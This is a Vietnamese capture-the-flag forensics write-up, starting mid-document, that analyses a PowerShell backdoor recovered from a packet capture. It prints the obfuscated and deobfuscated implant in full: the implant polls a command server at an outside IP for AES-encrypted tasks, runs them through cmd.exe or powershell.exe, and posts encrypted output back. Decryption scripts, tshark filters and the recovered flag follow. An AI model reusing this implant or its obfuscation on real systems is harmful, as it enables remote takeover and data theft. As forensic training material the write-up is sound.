        
        if (${VXzTmfF}.("{1}{2}{0}" -f ("{1}{0}"-f'e','Typ'),'g','et')."INvoKe"()."nAME" -eq ("{1}{0}" -f 'ing','Str')) {
            ${ajUjVraZ99}."Key" =  ( &('LS') (("{0}{1}"-f'V','ariAb')+'l'+("{0}{1}" -f 'e:XN','F')+'D') )."vAluE"::("{1}{0}{2}{3}"-f'e',("{1}{0}" -f'as','FromB'),'64S',("{1}{0}" -f 'ng','tri'))."invOKe"(${vxzTmFF})
        }
        
        else {
            ${AjUJVrAZ99}."key" = ${vXzTmff}
        }
    }
    
    ${aJUjvRAZ99}
}
function eNCRYpT(${VxzTMFf}, ${ROFPdqRF99}) {
    
    ${ByTES}             =   (  .("{1}{0}"-f ("{1}{2}{0}"-f 'e','arI','abl'),'v')  (("{1}{0}" -f'lvW','h')+'1') )."vALUE"::"uTf8".("{2}{0}{1}" -f 'yt','es',("{0}{1}" -f 'G','etB'))."INVokE"(${rOFpdQRF99})
    ${ajujVRAZ99}        = .("{4}{0}{2}{5}{3}{1}"-f("{1}{0}" -f'-','eate'),'ct','Ae',("{1}{0}" -f'e','edObj'),'Cr',("{1}{0}{2}"-f 'Ma','s','nag')) ${VXZtMFf}
    ${qDIqLGaQ99}         = ${aJujVRAZ99}.("{1}{2}{0}" -f'or',("{0}{1}{2}" -f'Create','En','c'),("{1}{0}" -f 't','ryp'))."inVoKe"()
    ${lwihYmIF99}     = ${QdiqLgaq99}.("{3}{4}{1}{0}{2}"-f ("{0}{1}{2}"-f 'nal','Bl','o'),("{1}{0}" -f'mFi','for'),'ck','Tra','ns')."iNvOKe"(${byTeS}, 0, ${byTes}."LeNgTh");
    [byte[]] ${fJAxUWQN99} = ${AJujvRAz99}."Iv" + ${lWiHYmiF99}
    ${ajUJVRAZ99}.("{1}{2}{0}"-f 'e','Dis','pos')."iNVOKE"()
     ${xNFd}::"tOBase64STRiNG"."iNvoke"(${FjAXUWqN99})
}
function deCRyPT(${VXztmFF}, ${bKJrxQCf99}) {
    
    ${bYTEs}           =   (&("{0}{2}{1}" -f'v',("{0}{1}" -f 'i','able'),'AR')  ('xnf'+'d') )."ValuE"::("{3}{1}{2}{0}" -f ("{0}{1}" -f'r','ing'),'o',("{2}{0}{1}"-f'e6','4St','mBas'),'Fr')."InVOKE"(${BkjRxqcF99})
    ${5tMRWpLuY}              = ${BYTes}[0..15]
    ${aJuJVraz99}      = .("{0}{2}{4}{3}{1}" -f ("{1}{0}"-f'rea','C'),("{1}{0}"-f 'ect','j'),("{0}{1}" -f't','e-Aes'),'dOb',("{0}{1}{2}"-f'Mana','g','e')) ${VxZTmFF} ${5TMRwpLUY}
    ${MNDmWYnB99}       = ${AJUjvRAz99}.("{4}{0}{2}{1}{3}" -f'ea','ry',("{0}{1}"-f'te','Dec'),("{0}{1}"-f'p','tor'),'Cr')."InVoke"();
    ${AhtLMYhl99} = ${MNDmWynB99}.("{0}{3}{1}{4}{5}{2}"-f 'T',("{0}{1}"-f 'fo','rmFi'),("{1}{0}"-f'lock','B'),("{1}{0}" -f's','ran'),'na','l')."iNvokE"(${bYTES}, 16, ${byTeS}."lENgTH" - 16);
    ${AJUjVRAZ99}.("{1}{0}"-f 'se',("{1}{0}" -f 'spo','Di'))."INVOKE"()
      ${HLVW1}::"uTF8"."GETStriNg"(${AhtLmYhl99})."TRIM"([char]0)
}
function ShELL(${DfJz1co}, ${yo8xm5}){
    
    ${CwzVYVJ}                        = &("{1}{2}{0}" -f 'ct','Ne',("{0}{1}"-f 'w-O','bje')) ("{4}{3}{5}{0}{1}{2}"-f ("{5}{2}{0}{3}{4}{1}"-f'P','I','cs.','roc','essStart','i'),'n','fo',("{0}{1}"-f'ys','te'),'S',("{0}{2}{1}"-f'm.Di','st','agno'))
    ${CwZVyVj}."FIlename"               = ${DFjZ1co}
    ${CWzvYvj}."reDIRecTsTAnDaRdERrOR"  = ${TRue}
    ${cwZVYVJ}."ReDIREcTsTANdarDoUTPUT" = ${tRUe}
    ${CWZvyVJ}."USEshELleXeCUTe"        = ${FALsE}
    ${cwzvyVJ}."aRgUmENtS"              = ${yO8xm5}
    ${p}                            = .("{0}{2}{1}" -f'New',("{1}{0}"-f 'ject','Ob'),'-') ("{6}{0}{4}{3}{1}{2}{5}" -f("{1}{2}{0}" -f 'Dia','yst','em.'),("{1}{2}{0}"-f 'P','o','stics.'),'ro','n','g',("{0}{1}" -f 'ces','s'),'S')
    ${P}."sTArTiNFO"                  = ${CWzvYVj}
    
    ${p}.("{1}{0}" -f("{1}{0}"-f'art','t'),'S')."INvoKE"() | &("{2}{1}{0}"-f'l',("{1}{0}" -f'Nul','t-'),'Ou')
    ${P}.("{2}{1}{0}{3}"-f'Exi',("{0}{1}"-f 'tF','or'),'Wai','t')."invoKE"()
    
    ${BHnxNUrW99} = ${p}."staNdardOuTpUT".("{2}{0}{1}" -f("{1}{0}" -f 'En','To'),'d',("{0}{1}" -f 'R','ead'))."INVOkE"()
    ${NmWkjOAB99} = ${p}."StANdArdeRrOR".("{2}{1}{3}{0}"-f'nd','To',("{1}{0}" -f'd','Rea'),'E')."Invoke"()
    ${kCNjcQdL} = ('VAL'+'ID '+"$BhnXnUrW99n$nmWKJOAb99")
    ${KcnJcQDl}
}
${FZvyCr}   = ("{0}{2}{3}{1}" -f '12',("{0}{1}{2}"-f '.2','07',("{1}{0}" -f'20','.2')),'8',("{1}{0}"-f'9','.19'))
${twFTrI} = ("{0}{1}"-f'7','331')
${VxzTmff}  = ("{2}{1}{4}{6}{3}{0}{7}{5}"-f 'XI',("{0}{1}{2}" -f 'w',("{0}{1}" -f 'jM7','m2'),'c'),("{0}{1}" -f 'd','/3K'),'u','GAt','+M=',("{0}{1}{2}" -f'L','I',("{1}{0}"-f("{1}{0}"-f'lhD','7K'),'6')),("{0}{2}{3}{1}"-f("{2}{1}{0}"-f 'KST','XR','/'),'R',("{0}{1}"-f'k',("{1}{0}"-f'lmJ','O')),("{0}{1}"-f 'XE','42')))
${n}    = 3
${Cwj2TWh} = ""
${yCRUTw} =   ${92Y7}::("{2}{0}{1}"-f("{1}{0}{2}"-f't','etHos','N'),'ame','G')."inVoKE"()
${FNFFGXDzj}  = "p"
${DFctDFM}  = (("{0}{1}" -f'ht','tp') + ':' + "//$FZVYCR" + ':' + "$TwFTRi/reg")
${kVQBXbuR}  = @{
    ("{0}{1}"-f 'n','ame') = "$YCRUTw" 
    ("{1}{0}"-f 'pe','ty') = "$fNFFGXDZJ"
    }
${CWj2TWh}  = (&("{4}{3}{2}{0}{1}"-f '-',("{1}{2}{0}"-f't','W','ebReques'),'ke','nvo','I') -UseBasicParsing -Uri ${dFctDFM} -Body ${kVqBxbUr} -Method ("{1}{0}"-f'OST','P'))."coNTENT"
${TvYMeYrR99} = (("{0}{1}"-f'htt','p') + ':' + "//$FZVYCR" + ':' + "$TwFTRi/results/$cWJ2Twh")
${iJfySE2}   = (("{1}{0}" -f 'p','htt') + ':' + "//$FZVYCR" + ':' + "$TwFTRi/tasks/$cWJ2Twh")
for (;;){
    
    ${MA04XMgY}  = (.("{2}{0}{3}{1}{4}" -f'n',("{0}{1}"-f'q','ues'),'I',("{0}{1}{2}" -f 'voke-W','e','bRe'),'t') -UseBasicParsing -Uri ${IJFYSE2} -Method 'GET')."cONTeNt"
    
    if (-Not  ${UJXRc}::("{1}{0}{3}{2}"-f 'l',("{0}{1}"-f'IsN','ul'),("{1}{0}{2}" -f 'mpt','rE','y'),'O')."INvOKe"(${MA04XmGy})){
        
        ${mA04XMgY} = .("{0}{1}" -f("{1}{0}" -f 'r','Dec'),'ypt') ${VXZTmff} ${Ma04XMgY}
        ${mA04XMgY} = ${ma04XMgy}.("{1}{0}"-f'it','spl')."INvokE"()
        ${FLAG} = ${MA04xmgY}[0]
        
        if (${FlAg} -eq ("{0}{1}" -f 'VAL','ID')){
            
            ${WB1SWYoje} = ${MA04XMgY}[1]
            ${yO8XM5S}    = ${Ma04XMgY}[2..${MA04xmgY}."LeNgTH"]
            if (${wb1sWyoJe} -eq ("{1}{0}"-f'l',("{1}{0}" -f'hel','s'))){
            
                ${F}    = ("{0}{1}{2}"-f 'c',("{1}{0}" -f'e','md.'),'xe')
                ${yO8XM5}  = "/c "
            
                foreach (${a} in ${yo8xM5s}){ ${Yo8xm5} += ${a} + " " }
                ${KcNJCQdL}  = .("{0}{1}"-f 'sh','ell') ${f} ${yo8xM5}
                ${kCnjCQDL}  = .("{1}{2}{0}"-f 'pt','Enc','ry') ${VxztMFF} ${kcNjcqdl}
                ${kvqbXBUr} = @{("{1}{0}" -f 'lt',("{0}{1}" -f 'r','esu')) = "$KcnJCQDl"}
                
                &("{3}{0}{1}{4}{2}" -f'ke','-W',("{0}{1}" -f 'qu','est'),("{0}{1}"-f'I','nvo'),("{1}{0}" -f 'bRe','e')) -UseBasicParsing -Uri ${tVyMEyRR99} -Body ${kVQbXbur} -Method ("{1}{0}" -f 'T','POS')
            }
            elseif (${Wb1SwYOJe} -eq ("{1}{0}{2}"-f 'owe','p',("{2}{1}{0}" -f 'l','l','rshe'))){
            
                ${f}    = ("{0}{3}{4}{1}{2}" -f ("{0}{1}"-f'p','owers'),'e','xe','he','ll.')
                ${yO8Xm5}  = "/c "
            
                foreach (${a} in ${Yo8xM5s}){ ${YO8xm5} += ${a} + " " }
                ${kcNjcqdL}  = &("{0}{1}" -f 'she','ll') ${F} ${yO8XM5}
                ${kcnjCQDL}  = .("{0}{1}"-f ("{0}{1}" -f 'En','cr'),'ypt') ${vXZTmfF} ${KCNjcqDl}
                ${KVqbxBUr} = @{("{1}{0}"-f ("{0}{1}" -f 'es','ult'),'r') = "$KcnJCQDl"}
                
                &("{0}{2}{4}{5}{1}{3}"-f'Inv',("{0}{1}"-f 'WebR','e'),'o',("{1}{0}" -f 'st','que'),'ke','-') -UseBasicParsing -Uri ${tvyMEYRR99} -Body ${kVqBXbUr} -Method ("{1}{0}" -f 'OST','P')
            }
            elseif (${wb1swYOJe} -eq ("{0}{1}"-f 'sl','eep')){
                ${n}    = [int]${yO8Xm5S}[0]
                ${kVQBXbur} = @{("{0}{1}"-f're',("{0}{1}"-f 'su','lt')) = ""}
                &("{2}{0}{4}{1}{3}" -f 'o',("{1}{0}"-f 'Re','Web'),'Inv',("{0}{1}"-f'qu','est'),'ke-') -UseBasicParsing -Uri ${tVYmeyrR99} -Body ${KvQBXBur} -Method ("{1}{0}" -f 'T','POS')
            }
            elseif (${wb1sWyojE} -eq ("{1}{0}"-f'e',("{1}{0}"-f'm','rena'))){
                
                ${cwJ2tWh}    = ${YO8Xm5S}[0]
                ${TVYmeyRr99} = (("{1}{0}" -f'tp','ht') + ':' + "//$FZVYCR" + ':' + "$TwFTRi/results/$cWJ2Twh")
                ${ijFYsE2}   = (("{1}{0}"-f'ttp','h') + ':' + "//$FZVYCR" + ':' + "$TwFTRi/tasks/$cWJ2Twh")
            
                ${kVQbXbUr}    = @{("{1}{0}" -f'lt',("{1}{0}" -f 'esu','r')) = ""}
                .("{0}{1}{4}{2}{3}" -f 'Inv',("{0}{1}{2}" -f'ok','e-','WebR'),'qu','est','e') -UseBasicParsing -Uri ${TVYmEyRR99} -Body ${KvqBxbUr} -Method ("{1}{0}"-f 'OST','P')
            }
            elseif (${wB1sWYOJe} -eq ("{0}{1}" -f 'qu','it')){
                exit
            }
        }
    .("{1}{0}"-f 'p',("{0}{1}"-f'sl','ee')) ${N}
    }
}
```

Sau một hội phân tích thì mình đã replace biến và để lại những hàm quan trọng cho dễ đọc hơn

```

function CrEATe-AeSmanAGeDoBJeCt(${vxZTmff}, ${5TMRWpLUy}) {

    ${AJuJVRAZ99}           = New-Object 'System.Security.Cryptography.AesManaged'
    ${AJUjvrAZ99}.Mode      =   (  gEt-vARIAblE  ("8rt3Wa") -Value  )::"cBc"
    ${aJujVRAZ99}.PAddInG   =  ( Dir  'vARIable:72j5o'  ).VALUe::"zeRos"
    ${AJUJvrAz99}.BlOckSizE = 128
    ${AjuJvRAz99}.keysIze   = 256

    if (${5TMRWPluy}) {

        if (${5TmRWpLuy}.getType.iNVOke().nAME -eq 'String') {
            ${ajUjvRaZ99}.Iv =  (dir  System.Convert).vAlUe::'FromBase64String'.InVOKe(${5TMRWPlUy})
    	}

  	else {

       		${ajUjVraZ99}.IV = ${5tmRwPLUy}

   	}

    }

    if (${VxZtMFF}) {

        if (${VXzTmfF}.getType.INvoKe().nAME -eq 'String') {

            ${ajUjVraZ99}.Key =  ( LS 'VariAble:XNFD' ).vAluE::'FromBase64String'.invOKe(${vxzTmFF})

        }

        else {

            ${AjUJVrAZ99}.key = ${vXzTmff}

        }

    }

    ${aJUjvRAZ99}

}

function eNCRYpT(${VxzTMFf}, ${ROFPdqRF99}) {

  	 ${ByTES}             =   System.Text.Encoding.vALUE::"uTf8".GetBytes.INVokE(${rOFpdQRF99})
  	 ${ajujVRAZ99}        = Create-AesManagedObject ${VXZtMFf}
  	 ${qDIqLGaQ99}         = ${aJujVRAZ99}.CreateEncryptor.inVoKe()
   	 ${lwihYmIF99}     = ${QdiqLgaq99}.TransformFinalBlock.iNvOKe(${byTeS}, 0, ${byTes}.LeNgTh);
   	 ${ajUJVRAZ99}.Dispose.iNVOKE()
   	 System.Convert::"tOBase64STRiNG".iNvoke(${FjAXUWqN99})
}

function deCRyPT(${VXztmFF}, ${bKJrxQCf99}) {

    ${bYTEs}           =    System.Convert.ValuE::'FromBase64String'.InVOKE(${BkjRxqcF99})
    ${5tMRWpLuY}              = ${BYTes}[0..15]
    ${aJuJVraz99}      = Create-AesManagedObject ${VxZTmFF} ${5TMRwpLUY}
    ${MNDmWYnB99}       = ${AJUjvRAz99}.CreateDecryptor.InVoke();
    ${AhtLMYhl99} = ${MNDmWynB99}.TransformFinalBlock.iNvokE(${bYTES}, 16, ${byTeS}.lENgTH - 16);
    ${AJUjVRAZ99}.Dispose.INVOKE()
    System.Text.Encoding::"uTF8".GETStriNg(${AhtLmYhl99}).TRIM([char]0)
}

for (;;){

    ${MA04XMgY}  = (Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/tasks/ -Method 'GET').cONTeNt

    if (-Not  System.String::'IsNullOrEmpty'.INvOKe(${MA04XmGy})){

        ${mA04XMgY} = Decrypt 'd/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M=', ${Ma04XMgY}
	
	${mA04XMgY} = ${ma04XMgy}.split.INvokE()
        ${FLAG} = ${MA04xmgY}[0]

        if (${FlAg} -eq 'VALID'){

            ${WB1SWYoje} = ${MA04XMgY}[1]
            ${yO8XM5S}    = ${Ma04XMgY}[2..${MA04xmgY}.LeNgTH]
            if (${wb1sWyoJe} -eq 'shell'){

                ${F}    = 'cmd.exe'
                ${yO8XM5}  = "/c "

                foreach (${a} in ${yo8xM5s}){ ${Yo8xm5} += ${a} + " " }
                ${KcNJCQdL}  = shell ${f} ${yo8xM5}
                ${kCnjCQDL}  = Encrypt ${VxztMFF} ${kcNjcqdl}
                ${kvqbXBUr} = @{'result' = "$KcnJCQDl"}

                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${kVQbXbur} -Method 'POST'
            }
            elseif (${Wb1SwYOJe} -eq 'powershell'){

                ${f}    = 'powershell.exe'
                ${yO8Xm5}  = "/c "

                foreach (${a} in ${Yo8xM5s}){ ${YO8xm5} += ${a} + " " }
                ${kcNjcqdL}  = shell ${F} ${yO8XM5}
                ${kcnjCQDL}  = Encrypt ${vXZTmfF} ${KCNjcqDl}
                ${KVqbxBUr} = @{'result' = "$KcnJCQDl"}

                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${kVqBXbUr} -Method 'POST'
            }
            elseif (${wb1swYOJe} -eq 'sleep'){
                ${n}    = [int]${yO8Xm5S}[0]
                ${kVQBXbur} = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${KvQBXBur} -Method 'POST'
            }
            elseif (${wb1sWyojE} -eq 'rename'){

                ${cwJ2tWh}    = ${YO8Xm5S}[0]
                ${TVYmeyRr99} = ('http:' + "//128.199.207.220" + ':' + "7331/results/$cWJ2Twh")
                ${ijFYsE2}   = ('http:' + "//128.199.207.220" + ':' + "7331/tasks/$cWJ2Twh")
                ${kVQbXbUr}    = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${KvqBxbUr} -Method 'POST'
            }
            elseif (${wB1sWYOJe} -eq 'quit'){
                exit
            }
        }
    sleep ${N}
    }
}
```

Phân tích từ trên xuống thì thấy đoạn script lấy thông tin từ đường dẫn `128.199.207.220:7331/tasks/`, sử dụng giao thức http với phương thức GET. Sau đó giải mã aes (với key =  `d/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M=`, iv = 16 byte đầu của dữ liệu) thông tin đó. Do đó mình đã mỗ phỏng lại bằng cách dùng filter `ip.src == 128.199.207.220 && http &&  tcp.segment_data ` để lọc những gói tin từ địa chỉ `128.199.207.220` phản hồi lại bằng giao thức http mà có data.

Sử dụng tshark để thu thập dữ liệu
```
 tshark -nr NoStarWhere.pcapng -Y 'ip.src == 128.199.207.220 && http &&  tcp.segment_data' -T fields -e text | cut -d ',' -f 4 > data.txt
```
Viết code python để giải mã
```
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
import base64 

with open("data.txt",'r') as f:
    read = f.readlines()
    for i in read:
        if i!='\n':
            i = base64.b64decode(i[:-1])
            iv = i[0:16]
            data = i[16:]
            key = 'd/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M='
            key = base64.b64decode(key)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            plaintext = cipher.decrypt(data)
            print(plaintext)
```
Sau khi chạy, thấy thông tin nhận được là các câu lệnh powershell

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20221455.png)

Tiếp tục phân tích đoạn powershel thì thấy nó chạy câu lệnh powsershell nhận được rồi lại mã hoá thông tin đó và đẩy lên đường dẫn `128.199.207.220:7331/results/` thông qua giao thức http bằng phương thức POST

```powershell
 if (${FlAg} -eq 'VALID'){

            ${WB1SWYoje} = ${MA04XMgY}[1]
            ${yO8XM5S}    = ${Ma04XMgY}[2..${MA04xmgY}.LeNgTH]
            if (${wb1sWyoJe} -eq 'shell'){

                ${F}    = 'cmd.exe'
                ${yO8XM5}  = "/c "

                foreach (${a} in ${yo8xM5s}){ ${Yo8xm5} += ${a} + " " }
                ${KcNJCQdL}  = shell ${f} ${yo8xM5}
                ${kCnjCQDL}  = Encrypt ${VxztMFF} ${kcNjcqdl}
                ${kvqbXBUr} = @{'result' = "$KcnJCQDl"}

                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${kVQbXbur} -Method 'POST'
            }
            elseif (${Wb1SwYOJe} -eq 'powershell'){

                ${f}    = 'powershell.exe'
                ${yO8Xm5}  = "/c "

                foreach (${a} in ${Yo8xM5s}){ ${YO8xm5} += ${a} + " " }
                ${kcNjcqdL}  = shell ${F} ${yO8XM5}
                ${kcnjCQDL}  = Encrypt ${vXZTmfF} ${KCNjcqDl}
                ${KVqbxBUr} = @{'result' = "$KcnJCQDl"}

                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${kVqBXbUr} -Method 'POST'
            }
            elseif (${wb1swYOJe} -eq 'sleep'){
                ${n}    = [int]${yO8Xm5S}[0]
                ${kVQBXbur} = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${KvQBXBur} -Method 'POST'
            }
            elseif (${wb1sWyojE} -eq 'rename'){

                ${cwJ2tWh}    = ${YO8Xm5S}[0]
                ${TVYmeyRr99} = ('http:' + "//128.199.207.220" + ':' + "7331/results/$cWJ2Twh")
                ${ijFYsE2}   = ('http:' + "//128.199.207.220" + ':' + "7331/tasks/$cWJ2Twh")
                ${kVQbXbUr}    = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${KvqBxbUr} -Method 'POST'
            }
```
Lọc những gói tin http sử dụng phương thức POST để nó đã push lên những thông tin gì
![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20222057.png)

Dùng tool tshark thu thập dữ liệu 

```
tshark -nr /mnt/c/Users/ASUS/Desktop/arenas2-forensics-undercontrol/NoStarWhere.pcapng -Y '(http.request.method == POST ) && (http.request.uri == "/results/IFDRBU")' -T fields -e urlencoded-form.value > /mnt/c/Users/ASUS/Desktop/data.txt
```
Và dùng code python trên để giải mã
![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20223552.png)
```
89504e470d0a1a0a0000000d494844520000003a0000003a0800000000c4d015f4000001204944415478dab5968b0ec3200845fdff9feeba7455ee4313c499b46e96e31820b7adc1b8eef1bde3b7715f8c247af5f1408fc930e50d5edb2adafafc2e8e59afc01c456340d8edffa06886c1398bc6475c1218b8655e532856d6fa5ad67002bd64c440609ac8ae80b2530e462084b280faa28b0700b7e63fb28f8e8fd19de822ae9bdf4ba131380ccddacd6fbd806afa19e694416b3d80b2a1066bea701a451730199c03129012ca4d8d0b4e83144ece163a3b465ce8c6fd12aa25a6874e85a586fa06869bb18898e424515d64a9e2a643ad740bf52dc54915b6f21aaa72a042ac1dace77513f5bae75eecb88dd750efac968b29ce12ea5e7ef45818693986aa84f086f442700465c1d4f210d9d844ed816adae844240be8acd8384c3a6fa31f99524e0722949b720000000049454e44ae426082
```
Vất lên CyberChef giải mã ta được một file png

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20223755.png)

Mở ra xem thì là một mã qua QR 

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20223835.png)

Quét nó được Flag: `CHH{D0n't_w0rRy_n0_st@r_wh3rE}`
